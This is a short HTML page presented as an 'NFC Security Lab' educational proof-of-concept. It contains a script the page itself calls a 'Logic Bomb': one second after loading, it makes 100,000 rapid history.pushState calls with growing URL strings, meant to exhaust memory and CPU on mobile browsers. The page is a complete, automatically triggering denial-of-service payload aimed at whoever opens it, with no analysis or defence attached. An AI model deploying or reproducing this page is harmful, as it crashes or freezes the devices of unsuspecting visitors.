<!DOCTYPE html>
<html>
<head>
    <title>NFC Security Lab</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #1a1a1a; color: white; }
        .warning { color: #ff4444; font-weight: bold; }
    </style>
</head>
<body>
    <h1>NFC URI Execution Lab</h1>
    <p class="warning">Educational Proof-of-Concept Only</p>
    <p>This page demonstrates how rapid <code>history.pushState</code> calls can impact device stability.</p>

    <script>
        // The "Logic Bomb"
        // This loop rapidly pushes new entries to the browser history.
        // On mobile, this consumes RAM and CPU as the UI tries to track thousands of 'pages'.
        function triggerTest() {
            var total = "";
            for (var i = 0; i < 100000; i++) {
                total = total + i.toString();
                // This is the core exploit:
                history.pushState(0, 0, total);
            }
        }

        // Delay the trigger so the page actually loads first
        setTimeout(triggerTest, 1000);
    </script>
</body>
</html>
